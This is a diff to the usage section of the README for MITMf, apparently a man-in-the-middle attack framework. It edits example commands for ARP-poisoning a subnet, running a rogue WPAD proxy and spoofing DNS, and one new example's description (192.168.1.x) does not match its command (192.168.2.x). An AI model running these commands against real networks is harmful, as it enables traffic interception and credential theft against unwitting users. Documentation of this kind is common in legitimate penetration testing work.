@@ -69,13 +69,17 @@ The most basic usage, starts the HTTP proxy SMB,DNS,HTTP servers and Net-Creds o
 
 ```python mitmf.py -i enp3s0```
 
-ARP poison 192.168.1.0/24 with the gateway at 192.168.1.1 using the **Spoof** plugin:
+ARP poison the whole subnet with the gateway at 192.168.1.1 using the **Spoof** plugin:
 
-```python mitmf.py -i enp3s0 --spoof --arp --target 192.168.1.0/24 --gateway 192.168.1.1```
+```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1```
 
 Same as above + a WPAD rogue proxy server using the **Responder** plugin:
 
-```python mitmf.py -i enp3s0 --spoof --arp --target 192.168.0.0/24 --gateway 192.168.1.1 --responder --wpad```
+```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --responder --wpad```
+
+ARP poison 192.168.1.16-45 and 192.168.0.1/24 with the gateway at 192.168.1.1:
+
+```python mitmf.py -i enp3s0 --spoof --arp --target 192.168.2.16-45,192.168.0.1/24 --gateway 192.168.1.1```
 
 Enable DNS spoofing while ARP poisoning (Domains to spoof are pulled from the config file):
 
